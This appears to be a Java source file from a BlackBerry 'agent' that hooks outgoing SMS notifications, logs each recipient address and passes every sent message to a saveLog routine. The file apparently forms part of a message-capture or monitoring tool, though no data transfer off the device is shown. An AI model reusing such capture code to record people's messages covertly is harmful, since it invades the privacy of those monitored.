package blackberry.agent.sms;

import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

import net.rim.blackberry.api.sms.OutboundMessageListener;
import net.rim.device.api.system.SMSParameters;

public class SMSOUTListener implements OutboundMessageListener{
  //#ifdef DEBUG
    private static Debug debug = new Debug("SMSOUTListener", DebugLevel.VERBOSE);
    //#endif
    
    SmsListener smsListener;
    
    public SMSOUTListener(SmsListener smsListener){
        this.smsListener = smsListener;
    }
    
    public void notifyOutgoingMessage(Message message) {
        //#ifdef DEBUG_INFO
        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
        //#endif
        
       smsListener.saveLog(message, false);        
    }

    public void notifyIncomingMessage(MessageConnection arg0) {
        //#ifdef DEBUG_INFO
        debug.info("notifyIncomingMessage: " + arg0.toString());
        //#endif        
    }
    
}
